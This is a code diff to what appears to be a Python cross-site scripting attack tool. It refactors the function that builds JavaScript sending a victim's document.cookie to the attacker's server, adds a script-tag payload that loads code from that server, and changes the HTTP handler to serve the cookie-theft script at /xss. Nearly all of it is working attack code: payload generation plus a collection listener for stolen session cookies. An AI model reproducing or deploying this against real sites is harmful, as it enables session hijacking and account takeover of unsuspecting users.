@@ -6,11 +6,16 @@ import http.server
 import socketserver
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-def getCookieAddress(address, port):
+# returns http address
+def getServerAddress(address, port):
     if port == 80:
-        return "'http://%s/?x='+document.cookie" % address
+        return "http://%s" % address
     else:
-        return "'http://%s:%d/?x='+document.cookie" % (address, port)
+        return "http://%s:%d" % (address, port)
+
+# returns js code: 'http://xxxx:yy/?x='+document.cookie
+def getCookieAddress(address, port):
+    return "'%s/?x='+document.cookie" % getServerAddress(address, port)
 
 def generatePayload(type, address, port):
 
@@ -23,6 +28,7 @@ def generatePayload(type, address, port):
 
     if type == "script":
         payloads.append('<script type="text/javascript">document.location=%s</script>' % cookieAddress)
+        payloads.append('<script src="%s/xss" />' % getServerAddress(address, port))
 
     if len(payloads) == 0:
         return None
@@ -41,7 +47,11 @@ class XssServer(BaseHTTPRequestHandler):
 
     def do_GET(self):
         self._set_headers()
-        self.wfile.write(self._html())
+        if self.path == "/xss":
+            cookie_addr = getCookieAddress(util.getAddress(), listen_port)
+            self.wfile.write(cookie_addr.encode())
+        else:
+            self.wfile.write(self._html())
 
     def do_HEAD(self):
         self._set_headers()
